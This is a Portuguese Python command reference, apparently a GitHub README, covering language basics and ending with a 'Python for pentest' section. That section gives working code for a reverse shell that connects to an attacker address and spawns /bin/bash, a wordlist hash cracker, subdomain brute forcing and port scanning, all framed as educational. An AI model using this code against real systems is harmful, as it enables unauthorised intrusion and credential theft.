# 🐍 Python — Guia Completo de Comandos
**github.com/felipeds-cdc**

> ⚠️ **AVISO LEGAL:** Os exemplos de pentest são estritamente educacionais.
> Use apenas em ambientes autorizados — **Lei 12.737/2012**.

---

## 📋 Índice

1. [Executando Python](#-1-executando-python)
2. [Tipos de Dados](#-2-tipos-de-dados)
3. [Strings](#-3-strings)
4. [Listas e Tuplas](#-4-listas-e-tuplas)
5. [Dicionários](#-5-dicionários)
6. [Condicionais e Loops](#-6-condicionais-e-loops)
7. [Funções](#-7-funções)
8. [Arquivos](#-8-arquivos)
9. [Tratamento de Erros](#-9-tratamento-de-erros)
10. [Módulos Essenciais](#-10-módulos-essenciais)
11. [Orientação a Objetos](#-11-orientação-a-objetos)
12. [Comprehensions](#-12-comprehensions)
13. [Solução de Problemas](#-13-solução-de-problemas)
14. [Python para Pentest](#-14-python-para-pentest)

---

## ▶️ 1. EXECUTANDO PYTHON

```bash
# Verificar versão
python3 --version
python3 -V

# Rodar script
python3 script.py

# Rodar com argumento
python3 script.py argumento1 argumento2

# Modo interativo (REPL)
python3

# Executar linha direta no terminal
python3 -c "print('Hello, Kali!')"

# Instalar pacotes
pip3 install requests
pip3 install requests scapy nmap           # múltiplos
pip3 install -r requirements.txt           # instala lista de dependências
pip3 list                                  # lista pacotes instalados
pip3 show requests                         # info de um pacote
pip3 freeze > requirements.txt            # gera arquivo de dependências

# Tornar script executável
chmod +x script.py
./script.py                               # requer #!/usr/bin/env python3 no topo

# Verificar erros de sintaxe sem rodar
python3 -m py_compile script.py

# Modo verbose — mostra imports
python3 -v script.py
```

---

## 📦 2. TIPOS DE DADOS

```python
# Inteiro
idade = 21
binario = 0b1010                          # binário → 10
hexadecimal = 0xFF                        # hex → 255
octal = 0o17                              # octal → 15

# Float
pi = 3.14159
cientifico = 1.5e10                       # 15000000000.0

# String
nome = "Felipe"
nome = 'Felipe'
multiline = """
    linha 1
    linha 2
"""

# Booleano
ativo = True
inativo = False

# None (equivalente ao null)
resultado = None

# Verificar tipo
type(idade)                               # <class 'int'>
type(nome)                                # <class 'str'>
isinstance(idade, int)                    # True
isinstance(nome, str)                     # True

# Conversão de tipos
int("42")                                 # string → int
float("3.14")                             # string → float
str(42)                                   # int → string
bool(0)                                   # 0 → False
bool(1)                                   # 1 → True
list("abc")                               # string → ['a', 'b', 'c']
bin(255)                                  # int → binário: '0b11111111'
hex(255)                                  # int → hex: '0xff'
ord('A')                                  # char → ASCII: 65
chr(65)                                   # ASCII → char: 'A'
```

---

## 📝 3. STRINGS

```python
texto = "Kali Linux é incrível"

# Acesso e fatiamento
texto[0]                                  # 'K'
texto[-1]                                 # 'l'
texto[0:4]                                # 'Kali'
texto[5:]                                 # 'Linux é incrível'
texto[:4]                                 # 'Kali'
texto[::2]                                # caracteres alternados
texto[::-1]                               # reverso

# Métodos essenciais
texto.upper()                             # 'KALI LINUX É INCRÍVEL'
texto.lower()                             # 'kali linux é incrível'
texto.strip()                             # remove espaços das bordas
texto.lstrip()                            # remove espaços à esquerda
texto.rstrip()                            # remove espaços à direita
texto.replace("Kali", "Parrot")           # substitui substring
texto.split(" ")                          # divide: ['Kali', 'Linux', ...]
texto.split(" ", 1)                       # divide só na primeira ocorrência
" ".join(["Kali", "Linux"])               # une lista: 'Kali Linux'
texto.startswith("Kali")                  # True
texto.endswith("vel")                     # True
texto.find("Linux")                       # índice ou -1
texto.count("i")                          # conta ocorrências
texto.isdigit()                           # só números?
texto.isalpha()                           # só letras?
texto.isalnum()                           # letras e números?
len(texto)                                # tamanho

# Formatação
nome = "Felipe"
porta = 22
f"Usuário: {nome}, Porta: {porta}"        # f-string (recomendado)
"Usuário: {}, Porta: {}".format(nome, porta)
"Usuário: %s, Porta: %d" % (nome, porta) # formato antigo

# Encode/Decode — importante para pentest
texto.encode("utf-8")                     # string → bytes
b"dados".decode("utf-8")                  # bytes → string
texto.encode("utf-8").hex()              # string → hex

# Base64
import base64
base64.b64encode(b"senha123")             # codifica
base64.b64decode("c2VuaGExMjM=")         # decodifica

# Raw string — útil para regex e paths
caminho = r"C:\Users\Felipe\Desktop"
regex = r"\d{3}-\d{4}"
```

---

## 📋 4. LISTAS E TUPLAS

```python
# Lista — mutável
portas = [21, 22, 80, 443, 3306]
misturada = [1, "ssh", True, 3.14]

# Acesso
portas[0]                                 # 21
portas[-1]                                # 3306
portas[1:3]                               # [22, 80]

# Modificar
portas.append(8080)                       # adiciona no final
portas.insert(0, 20)                      # insere na posição 0
portas.extend([8443, 9000])               # adiciona múltiplos
portas.remove(21)                         # remove por valor
portas.pop()                              # remove e retorna o último
portas.pop(0)                             # remove e retorna índice 0
portas[0] = 25                            # substitui valor

# Busca e info
22 in portas                              # True se existe
portas.index(80)                          # posição do valor
portas.count(22)                          # quantas vezes aparece
len(portas)                               # tamanho

# Ordenação
portas.sort()                             # ordena in-place crescente
portas.sort(reverse=True)                 # decrescente
sorted(portas)                            # retorna nova lista ordenada
portas.reverse()                          # inverte in-place

# Operações úteis
portas.copy()                             # cópia rasa
list(set(portas))                         # remove duplicatas
min(portas)                               # menor valor
max(portas)                               # maior valor
sum(portas)                               # soma

# Iterar com índice
for i, porta in enumerate(portas):
    print(f"[{i}] Porta: {porta}")

# Tupla — imutável
credencial = ("admin", "senha123")
host, porta = ("192.168.1.1", 22)         # unpacking
ip, *resto = ["192.168.1.1", 22, "ssh"]  # unpacking com *
```

---

## 📚 5. DICIONÁRIOS

```python
# Criar
host = {
    "ip": "192.168.1.1",
    "hostname": "router",
    "portas": [22, 80, 443],
    "so": "Linux"
}

# Acessar
host["ip"]                                # '192.168.1.1'
host.get("ip")                            # igual mas sem KeyError
host.get("versao", "desconhecido")        # valor padrão se não existir

# Modificar
host["versao"] = "Ubuntu 22.04"           # adiciona ou atualiza
host.update({"porta_ssh": 22})            # atualiza múltiplos
del host["hostname"]                      # remove chave
host.pop("so")                            # remove e retorna valor

# Navegar
host.keys()                               # dict_keys(['ip', 'portas'...])
host.values()                             # dict_values(['192.168.1.1'...])
host.items()                              # pares (chave, valor)
"ip" in host                              # True se chave existe
len(host)                                 # número de chaves

# Iterar
for chave, valor in host.items():
    print(f"{chave}: {valor}")

# Dicionário aninhado
rede = {
    "192.168.1.1": {"hostname": "router", "portas": [80, 443]},
    "192.168.1.2": {"hostname": "server", "portas": [22, 3306]},
}
rede["192.168.1.1"]["portas"]             # [80, 443]

# Funções úteis
dict.fromkeys(["a", "b", "c"], 0)        # {'a':0, 'b':0, 'c':0}
{**host, **{"novo": "valor"}}             # merge de dicionários
```

---

## 🔄 6. CONDICIONAIS E LOOPS

```python
# ---- IF / ELIF / ELSE ----
porta = 22
if porta == 22:
    print("SSH")
elif porta == 80:
    print("HTTP")
elif porta == 443:
    print("HTTPS")
else:
    print(f"Porta desconhecida: {porta}")

# Ternário (uma linha)
servico = "SSH" if porta == 22 else "Outro"

# ---- FOR ----
for porta in [21, 22, 80, 443]:
    print(porta)

for i in range(1, 101):                   # 1 até 100
    print(i)

for i in range(0, 65536, 1000):          # de 1000 em 1000
    print(i)

# Controle de loop
for porta in range(1, 1025):
    if porta == 80:
        continue                          # pula para próxima iteração
    if porta == 500:
        break                             # para o loop
    print(porta)

# For com else (raro mas útil)
for porta in portas:
    if porta == 22:
        print("SSH encontrado!")
        break
else:
    print("SSH não encontrado")           # executa se loop terminou sem break

# ---- WHILE ----
tentativas = 0
while tentativas < 3:
    print(f"Tentativa {tentativas}")
    tentativas += 1

# While com condição de saída
while True:
    entrada = input("Digite 'sair' para encerrar: ")
    if entrada == "sair":
        break

# ---- MATCH (Python 3.10+) ----
match porta:
    case 21:
        print("FTP")
    case 22:
        print("SSH")
    case 80 | 8080:
        print("HTTP")
    case _:
        print("Desconhecido")
```

---

## 🔧 7. FUNÇÕES

```python
# Básica
def saudar(nome):
    return f"Olá, {nome}!"

# Parâmetro padrão
def scan_porta(host, porta=80, timeout=1):
    return f"Scaneando {host}:{porta}"

# Múltiplos retornos
def info_host(ip):
    hostname = "servidor"
    so = "Linux"
    return hostname, so                   # retorna tupla

host, sistema = info_host("192.168.1.1") # unpacking

# *args — múltiplos argumentos
def somar(*numeros):
    return sum(numeros)

somar(1, 2, 3, 4, 5)                     # 15

# **kwargs — argumentos nomeados
def criar_host(**dados):
    return dados

criar_host(ip="192.168.1.1", porta=22)  # {'ip': ..., 'porta': ...}

# Anotações de tipo (type hints)
def scan(host: str, porta: int, timeout: float = 1.0) -> bool:
    pass

# Lambda — função anônima de uma linha
dobrar = lambda x: x * 2
ordenar_por_porta = sorted(hosts, key=lambda h: h["porta"])

# Funções de alta ordem
portas = [21, 22, 80, 443, 8080]
abertas = list(filter(lambda p: p > 80, portas))    # filtra
dobradas = list(map(lambda p: p * 2, portas))        # transforma

# Decoradores simples
def medir_tempo(func):
    import time
    def wrapper(*args, **kwargs):
        inicio = time.time()
        resultado = func(*args, **kwargs)
        print(f"Tempo: {time.time() - inicio:.2f}s")
        return resultado
    return wrapper

@medir_tempo
def scan_lento():
    import time
    time.sleep(2)
```

---

## 📂 8. ARQUIVOS

```python
# ---- Leitura ----
# Lê arquivo inteiro
with open("wordlist.txt", "r") as f:
    conteudo = f.read()

# Lê linha por linha (eficiente para arquivos grandes)
with open("rockyou.txt", "r", errors="ignore") as f:
    for linha in f:
        senha = linha.strip()

# Lê todas as linhas numa lista
with open("ips.txt", "r") as f:
    linhas = f.readlines()               # ['192.168.1.1\n', ...]
    linhas = [l.strip() for l in f]      # sem \n

# ---- Escrita ----
# Sobrescreve
with open("resultado.txt", "w") as f:
    f.write("Scan concluído\n")

# Adiciona ao final
with open("log.txt", "a") as f:
    f.write(f"[2026-03-21] Porta 22 aberta\n")

# Escreve lista
with open("portas.txt", "w") as f:
    f.writelines([f"{p}\n" for p in [22, 80, 443]])

# ---- JSON ----
import json

# Salva dicionário em JSON
dados = {"ip": "192.168.1.1", "portas": [22, 80]}
with open("resultado.json", "w") as f:
    json.dump(dados, f, indent=2, ensure_ascii=False)

# Carrega JSON
with open("resultado.json", "r") as f:
    dados = json.load(f)

# String → dict e dict → string
texto_json = json.dumps(dados)            # dict → string JSON
dados = json.loads('{"ip": "1.1.1.1"}')  # string JSON → dict

# ---- CSV ----
import csv

# Escreve CSV
with open("hosts.csv", "w", newline="") as f:
    writer = csv.writer(f)
    writer.writerow(["IP", "Porta", "Serviço"])
    writer.writerow(["192.168.1.1", 22, "SSH"])

# Lê CSV
with open("hosts.csv", "r") as f:
    reader = csv.DictReader(f)
    for linha in reader:
        print(linha["IP"], linha["Porta"])

# ---- Operações de arquivo ----
import os
import shutil

os.path.exists("arquivo.txt")            # existe?
os.path.isfile("arquivo.txt")            # é arquivo?
os.path.isdir("pasta/")                  # é diretório?
os.path.getsize("arquivo.txt")           # tamanho em bytes
os.path.basename("/home/felipe/arq.txt") # 'arq.txt'
os.path.dirname("/home/felipe/arq.txt")  # '/home/felipe'
os.makedirs("pasta/subpasta", exist_ok=True)
os.listdir(".")                           # lista arquivos da pasta
os.remove("arquivo.txt")                  # deleta arquivo
shutil.copy("origem.txt", "destino.txt") # copia arquivo
shutil.move("origem.txt", "destino/")    # move arquivo
```

---

## 🚨 9. TRATAMENTO DE ERROS

```python
# Try / Except básico
try:
    resultado = 10 / 0
except ZeroDivisionError:
    print("Divisão por zero!")

# Múltiplas exceções
try:
    arquivo = open("inexistente.txt")
    valor = int("abc")
except FileNotFoundError as e:
    print(f"Arquivo não encontrado: {e}")
except ValueError as e:
    print(f"Valor inválido: {e}")
except Exception as e:
    print(f"Erro genérico: {e}")
finally:
    print("Isso sempre executa")          # limpa recursos

# Capturar e re-lançar
try:
    conexao = socket.connect(("192.168.1.1", 22))
except ConnectionRefusedError:
    print("Porta fechada")
    raise                                 # re-lança a exceção

# Lançar exceção personalizada
class PortaFechadaError(Exception):
    pass

def verificar_porta(porta):
    if porta < 1 or porta > 65535:
        raise ValueError(f"Porta inválida: {porta}")

# Exceções comuns em scripts de rede/pentest
try:
    pass
except socket.timeout:
    print("Timeout na conexão")
except socket.gaierror:
    print("Erro de DNS — host não resolvido")
except ConnectionRefusedError:
    print("Conexão recusada — porta fechada")
except PermissionError:
    print("Permissão negada — tente com sudo")
except KeyboardInterrupt:
    print("\nInterrompido pelo usuário (Ctrl+C)")
    sys.exit(0)
except Exception as e:
    print(f"Erro inesperado: {type(e).__name__}: {e}")
```

---

## 📦 10. MÓDULOS ESSENCIAIS

### sys — sistema
```python
import sys

sys.argv                                  # argumentos da linha de comando
sys.argv[0]                               # nome do script
sys.argv[1]                               # primeiro argumento
len(sys.argv)                             # número de argumentos
sys.exit(0)                               # encerra com código 0 (sucesso)
sys.exit(1)                               # encerra com erro
sys.platform                              # 'linux', 'win32', 'darwin'
sys.version                               # versão do Python
sys.path                                  # caminhos de busca de módulos
```

### os — sistema operacional
```python
import os

os.getcwd()                               # diretório atual
os.chdir("/tmp")                          # muda diretório
os.environ                                # variáveis de ambiente
os.environ.get("HOME")                    # variável específica
os.getenv("PATH")                         # alternativa
os.system("ls -la")                       # executa comando (simples)
os.getpid()                               # PID do processo atual
os.getuid()                               # UID do usuário (Linux)
os.cpu_count()                            # núcleos disponíveis
```

### subprocess — executar comandos
```python
import subprocess

# Rodar e capturar saída
resultado = subprocess.run(
    ["nmap", "-sV", "192.168.1.1"],
    capture_output=True,
    text=True,
    timeout=30
)
print(resultado.stdout)
print(resultado.stderr)
print(resultado.returncode)              # 0 = sucesso

# Versão simples (sem captura)
subprocess.run(["ls", "-la"])

# Shell command (string ao invés de lista)
subprocess.run("nmap -sV 192.168.1.1", shell=True)

# Pipe entre comandos
p1 = subprocess.Popen(["cat", "arquivo.txt"], stdout=subprocess.PIPE)
p2 = subprocess.Popen(["grep", "admin"], stdin=p1.stdout, stdout=subprocess.PIPE)
saida = p2.communicate()[0].decode()
```

### datetime — datas e horas
```python
from datetime import datetime, timedelta

agora = datetime.now()
agora.strftime("%Y-%m-%d %H:%M:%S")      # formata
agora.strftime("%d/%m/%Y")               # formato brasileiro
datetime.strptime("21/03/2026", "%d/%m/%Y")  # string → datetime
datetime.now() + timedelta(days=30)      # daqui 30 dias
datetime.now() - timedelta(hours=2)      # 2 horas atrás
```

### re — expressões regulares
```python
import re

texto = "IP: 192.168.1.1 e porta: 8080"

# Buscar
re.search(r"\d+\.\d+\.\d+\.\d+", texto)          # primeiro match
re.findall(r"\d+", texto)                          # todos os matches
re.match(r"IP:", texto)                            # só no início

# Substituir
re.sub(r"\d+", "X", texto)                        # substitui números por X

# Extrair grupos
match = re.search(r"(\d+\.\d+\.\d+\.\d+)", texto)
if match:
    ip = match.group(1)                            # '192.168.1.1'

# Padrões úteis para pentest
r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"            # IPv4
r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" # Email
r"https?://[^\s]+"                                 # URL
r"[0-9a-fA-F]{32}"                                # Hash MD5
r"[0-9a-fA-F]{40}"                                # Hash SHA1
r"Bearer\s+[\w\-\.]+\.[\w\-\.]+\.[\w\-\.]+"      # JWT Token
```

### threading — paralelismo
```python
import threading
from concurrent.futures import ThreadPoolExecutor

# Thread simples
def scan_porta(host, porta):
    # lógica de scan
    pass

thread = threading.Thread(target=scan_porta, args=("192.168.1.1", 80))
thread.start()
thread.join()                             # aguarda terminar

# ThreadPoolExecutor — mais fácil e recomendado
def scan(porta):
    # lógica de scan
    return porta

portas = range(1, 1025)
with ThreadPoolExecutor(max_workers=100) as executor:
    resultados = list(executor.map(scan, portas))
```

### hashlib — criptografia
```python
import hashlib

# Gerar hashes
hashlib.md5(b"senha123").hexdigest()          # MD5
hashlib.sha1(b"senha123").hexdigest()         # SHA1
hashlib.sha256(b"senha123").hexdigest()       # SHA256
hashlib.sha512(b"senha123").hexdigest()       # SHA512

# Com salt
import secrets
salt = secrets.token_bytes(16)
hash_com_salt = hashlib.sha256(salt + b"senha").hexdigest()

# Comparar hash
senha_digitada = "senha123"
hash_correto = "482c811da5d5b4bc6d497ffa98491e38"
hashlib.md5(senha_digitada.encode()).hexdigest() == hash_correto
```

---

## 🏛️ 11. ORIENTAÇÃO A OBJETOS

```python
# Classe básica
class Host:
    # Atributo de classe (compartilhado por todos)
    protocolo = "TCP"

    def __init__(self, ip, hostname="desconhecido"):
        # Atributos de instância
        self.ip = ip
        self.hostname = hostname
        self.portas = []
        self._privado = "interno"          # convenção: privado

    def adicionar_porta(self, porta, servico):
        self.portas.append({"porta": porta, "servico": servico})

    def listar_portas(self):
        for p in self.portas:
            print(f"  {p['porta']}: {p['servico']}")

    def __str__(self):
        return f"Host({self.ip} / {self.hostname})"

    def __repr__(self):
        return f"Host(ip='{self.ip}')"

    def __len__(self):
        return len(self.portas)

# Herança
class ServidorWeb(Host):
    def __init__(self, ip, cms="desconhecido"):
        super().__init__(ip)               # chama __init__ do pai
        self.cms = cms
        self.adicionar_porta(80, "HTTP")
        self.adicionar_porta(443, "HTTPS")

    def listar_portas(self):
        print(f"[Servidor Web] {self.ip}")
        super().listar_portas()            # chama método do pai

# Uso
host = Host("192.168.1.1", "router")
host.adicionar_porta(22, "SSH")
host.adicionar_porta(80, "HTTP")
print(host)                               # Host(192.168.1.1 / router)
print(len(host))                          # 2

servidor = ServidorWeb("192.168.1.2", "WordPress")
servidor.listar_portas()
```

---

## ⚡ 12. COMPREHENSIONS

```python
# List comprehension
portas = [p for p in range(1, 1025)]
pares = [p for p in range(1, 1025) if p % 2 == 0]
quadrados = [x**2 for x in range(10)]

# Com função
def eh_primo(n):
    if n < 2: return False
    for i in range(2, int(n**0.5)+1):
        if n % i == 0: return False
    return True

primos = [n for n in range(2, 100) if eh_primo(n)]

# Dict comprehension
servicos = {21: "FTP", 22: "SSH", 80: "HTTP", 443: "HTTPS"}
invertido = {v: k for k, v in servicos.items()}

# Set comprehension — sem duplicatas
ips_unicos = {host["ip"] for host in lista_hosts}

# Generator — eficiente para grandes volumes
senhas_gen = (linha.strip() for linha in open("rockyou.txt", errors="ignore"))
for senha in senhas_gen:
    # processa uma por vez sem carregar tudo na memória
    pass
```

---

## 🛠️ 13. SOLUÇÃO DE PROBLEMAS

```python
# ---- Debug ----
# Print debug básico
print(f"[DEBUG] variavel={variavel}")

# Breakpoint interativo (Python 3.7+)
breakpoint()                              # abre REPL no ponto exato

# Inspecionar objeto
print(dir(objeto))                        # lista atributos e métodos
print(vars(objeto))                       # dicionário de atributos
help(objeto)                              # documentação
type(objeto)                              # tipo do objeto

# ---- Problemas comuns ----

# Problema: encoding ao ler arquivo com acentos
with open("arquivo.txt", "r", encoding="utf-8") as f:
    conteudo = f.read()

# Problema: arquivo binário com caracteres inválidos
with open("wordlist.txt", "r", errors="ignore") as f:
    linhas = f.readlines()

# Problema: RecursionError
sys.setrecursionlimit(10000)              # aumenta limite de recursão

# Problema: MemoryError ao ler arquivo grande
# Errado — carrega tudo na memória
conteudo = open("rockyou.txt").readlines()

# Certo — processa linha por linha
with open("rockyou.txt", "r", errors="ignore") as f:
    for linha in f:
        processar(linha.strip())

# Problema: script lento — medir tempo
import time
inicio = time.time()
# ... código ...
print(f"Tempo: {time.time() - inicio:.4f}s")

# Problema: importar módulo de pasta diferente
import sys
sys.path.append("/caminho/para/pasta")
import meu_modulo

# Problema: variável não definida em função
contador = 0
def incrementar():
    global contador                       # acessa variável global
    contador += 1

# Problema: lista sendo modificada durante iteração
# Errado
for item in lista:
    if condicao:
        lista.remove(item)                # causa comportamento inesperado

# Certo
lista = [item for item in lista if not condicao]

# Verificar uso de memória
import tracemalloc
tracemalloc.start()
# ... código ...
atual, pico = tracemalloc.get_traced_memory()
print(f"Memória atual: {atual/1024:.1f}KB | Pico: {pico/1024:.1f}KB")
```

---

## 🔐 14. PYTHON PARA PENTEST

### Sockets — base de tudo
```python
import socket

# TCP connect scan
def scan_porta(ip, porta, timeout=1):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        resultado = sock.connect_ex((ip, porta))
        sock.close()
        return resultado == 0             # True = aberta
    except:
        return False

# UDP scan
def scan_udp(ip, porta):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        sock.sendto(b"", (ip, porta))
        sock.recvfrom(1024)
        return True
    except socket.timeout:
        return True                       # sem resposta = possivelmente aberta
    except:
        return False

# Banner grabbing — identifica serviço
def banner_grab(ip, porta):
    try:
        sock = socket.socket()
        sock.settimeout(3)
        sock.connect((ip, porta))
        banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
        sock.close()
        return banner
    except:
        return None

# Reverse shell simples (educacional — só em lab)
def reverse_shell(ip_atacante, porta):
    import os
    sock = socket.socket()
    sock.connect((ip_atacante, porta))
    os.dup2(sock.fileno(), 0)
    os.dup2(sock.fileno(), 1)
    os.dup2(sock.fileno(), 2)
    os.system("/bin/bash")
```

### Requisições HTTP
```python
import urllib.request

# GET simples
req = urllib.request.urlopen("http://alvo.com", timeout=5)
print(req.status)
print(req.headers.get("Server"))
print(req.read().decode())

# Com biblioteca requests (instalar: pip3 install requests)
import requests

# GET
r = requests.get("http://alvo.com", timeout=5)
print(r.status_code)
print(r.headers)
print(r.text)

# POST — login form
r = requests.post("http://alvo.com/login", data={
    "usuario": "admin",
    "senha": "senha123"
}, allow_redirects=False)

# Com headers customizados
headers = {"User-Agent": "Mozilla/5.0", "X-Custom": "teste"}
r = requests.get("http://alvo.com", headers=headers)

# Ignorar SSL inválido
r = requests.get("https://alvo.com", verify=False)

# Com proxy (Burp Suite na porta 8080)
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.get("http://alvo.com", proxies=proxies, verify=False)

# Com sessão (mantém cookies)
s = requests.Session()
s.post("http://alvo.com/login", data={"user": "admin", "pass": "1234"})
r = s.get("http://alvo.com/admin")       # usa cookies do login
```

### DNS e Reconhecimento
```python
import socket
import subprocess

# Resolver domínio
socket.gethostbyname("alvo.com")

# Reverse DNS
socket.gethostbyaddr("192.168.1.1")

# Múltiplos IPs de um domínio
socket.getaddrinfo("alvo.com", 80)

# Subdomínio brute force
def brute_subdominios(dominio, wordlist):
    encontrados = []
    with open(wordlist) as f:
        for sub in f:
            sub = sub.strip()
            host = f"{sub}.{dominio}"
            try:
                ip = socket.gethostbyname(host)
                print(f"[+] {host} → {ip}")
                encontrados.append((host, ip))
            except:
                pass
    return encontrados

# Consulta DNS via dig
resultado = subprocess.run(
    ["dig", "+short", "MX", "alvo.com"],
    capture_output=True, text=True
)
print(resultado.stdout)
```

### Quebrador de Hash
```python
import hashlib

def crack_hash(hash_alvo, tipo, wordlist):
    algoritmos = {
        "md5":    hashlib.md5,
        "sha1":   hashlib.sha1,
        "sha256": hashlib.sha256,
    }
    func = algoritmos.get(tipo.lower())
    if not func:
        print(f"Tipo não suportado: {tipo}")
        return None

    with open(wordlist, "r", errors="ignore") as f:
        for linha in f:
            senha = linha.strip()
            if func(senha.encode()).hexdigest() == hash_alvo:
                print(f"[+] Senha encontrada: {senha}")
                return senha

    print("[-] Senha não encontrada na wordlist")
    return None

# Uso
crack_hash(
    "482c811da5d5b4bc6d497ffa98491e38",
    "md5",
    "/usr/share/wordlists/rockyou.txt"
)
```

### Gerador de Wordlist
```python
import itertools
import string

def gerar_wordlist(chars, tamanho_min, tamanho_max, arquivo_saida):
    with open(arquivo_saida, "w") as f:
        for tamanho in range(tamanho_min, tamanho_max + 1):
            for combo in itertools.product(chars, repeat=tamanho):
                f.write("".join(combo) + "\n")

# Gera senhas de 4 dígitos numéricos
gerar_wordlist(string.digits, 4, 4, "pincodes.txt")

# Gera senhas alfanuméricas de 3 a 4 chars (cuidado com tamanho!)
gerar_wordlist(string.ascii_lowercase + string.digits, 3, 4, "wordlist.txt")
```

### Argumentos de linha de comando
```python
import argparse

parser = argparse.ArgumentParser(
    description="Scanner educacional",
    epilog="⚠ Use apenas em alvos autorizados"
)
parser.add_argument("alvo",                  help="IP ou domínio do alvo")
parser.add_argument("-p", "--porta",         type=int, default=80)
parser.add_argument("-t", "--timeout",       type=float, default=1.0)
parser.add_argument("-v", "--verbose",       action="store_true")
parser.add_argument("-o", "--output",        help="Arquivo de saída")
parser.add_argument("--portas",              nargs="+", type=int)

args = parser.parse_args()

print(args.alvo)
print(args.porta)
print(args.verbose)                       # True ou False

# Uso no terminal:
# python3 script.py 192.168.1.1 -p 22 -v -o resultado.txt
```

---

## ⚠️ Aviso Legal

```
Os exemplos de pentest são desenvolvidos exclusivamente
para fins educacionais e devem ser usados somente em:
  • Máquinas virtuais próprias (Metasploitable, DVWA)
  • Plataformas autorizadas (HackTheBox, TryHackMe)
  • Redes e sistemas com autorização expressa

O uso não autorizado configura crime.
Lei nº 12.737/2012 — Delitos Informáticos — Brasil.
```
